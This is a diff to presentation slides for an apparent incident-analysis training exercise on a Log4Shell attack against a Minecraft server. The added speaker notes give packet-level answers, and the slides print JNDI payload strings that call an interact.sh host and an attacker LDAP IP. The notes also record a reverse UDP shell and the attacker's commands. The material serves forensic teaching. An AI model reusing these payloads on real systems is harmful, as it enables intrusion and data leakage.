@@ -72,7 +72,7 @@
 \end{frame}
 
 \begin{frame}
-    \frametitle{Exercise 2: In-depth analysis}
+    \frametitle{Exercise 2: In-depth analysis 1/2}
         \begin{enumerate}
         \item Identify {\color{red}{\bf Attacker}} connection to the {\color{blue}{\bf Minecraft Server}}
         \item Search for {\bf \emph{jndi}} string using Wireshark packet string search, and extract all the payloads
@@ -88,7 +88,7 @@
 \end{frame}
 
 \begin{frame}[fragile]
-    \frametitle{Exercise 2: In-depth analysis summary}
+    \frametitle{Exercise 2: In-depth analysis 2/2}
    {\bf DNS payloads}
     \begin{lstlisting}[basicstyle=\tiny\color{black}]
 ${jndi:dns://hostname-${hostName}.c8nfads2vtc0000srss0grk4fxryyyyyr.interact.sh}
@@ -108,7 +108,7 @@ ${jndi:ldap://18.212.74.161:389/1svssl}
 \end{frame}
 
 \begin{frame}[fragile]
-    \frametitle{Exercise 3: Payload delivery and RCE}
+    \frametitle{Exercise 3: Payload delivery and RCE 1/2}
 	{Identify the TCP stream where the {\color{red}{\bf Attacker}} delivered the RCE payload to the {\color{blue}{\bf Minecraft Server}}}
 	\linebreak
     \begin{itemize}
@@ -123,11 +123,19 @@ File -> Export Objects -> HTTP...
 
     \end{itemize}
     \begin{center}Exercise duration: 15 minutes\end{center}
-    \note[item]{ip.src==18.212.74.161 \&\& udp}
+    \note[item]{The payload is a reverse UDP shell connecting to remote port 6666 on the attackers machine.}
+    \note[item]{filter reverse shell interaction: ip.src==18.212.74.161 \&\& udp}
+    \note[item]{The attacker runs the following commands:}
+    \note[item]{packet 5202: ls}
+    \note[item]{packet 5211: whoami}
+    \note[item]{packet 5216: id}
+    \note[item]{packet 5202: pwd}
+    \note[item]{packet 5238: wget http://www.youtube.com/watch?v=dQw4w9WgXcQ}
+    \note[item]{packet 6308: exit}
 \end{frame}
 
 \begin{frame}[fragile]
-    \frametitle{Exercise 3: Payload delivery and RCE summary}
+    \frametitle{Exercise 3: Payload delivery and RCE 2/2}
 	\begin{lstlisting}[basicstyle=\tiny\color{black},language=Java]
 // ExecTemplateJDK8.class
 package defpackage;
@@ -153,11 +161,23 @@ public class ExecTemplateJDK8 {
     }
 }
 	\end{lstlisting}
-    \note[item]{The payload is a reverse UDP shell connecting to remote port 6666 on the attackers machine.}
+
+    \note[item]{packet 5: legit player connects to Minecraft server and plays normally}
+    \note[item]{packet 1540: attacker connects to server via python script}
+    \note[item]{packet 2488-2496: attacker sends chat that triggers dns probe to interactsh (dns)}
+    \note[item]{packet 3378: attacker leaks user (dns)}
+    \note[item]{packet 3619: attacker leaks java (dns)}
+    \note[item]{packet 3798: attacker leaks java version (ldap)}
+    \note[item]{packet 4049: attacker leaks OS (ldap)}
+    \note[item]{packet 4266: attacker leaks java VM (ldap)}
+    \note[item]{packet 4468: attacker leaks java locale (ldap)}
+    \note[item]{packet 4729: attacker leaks HW (ldap)}
+    \note[item]{tcp.stream eq 33: attacker delivers UDP reverse shell payload (ldap \& http}
+    \note[item]{attacker runs a few cmds via reverse shell and exits}
 \end{frame}
 
 \begin{frame}[fragile]
-    \frametitle{MISP encoding 1/2}
+    \frametitle{Describing the timeline}
     Describe and encode the exfiltration process, data and target in MISP
     \note[item]{}
 \end{frame}
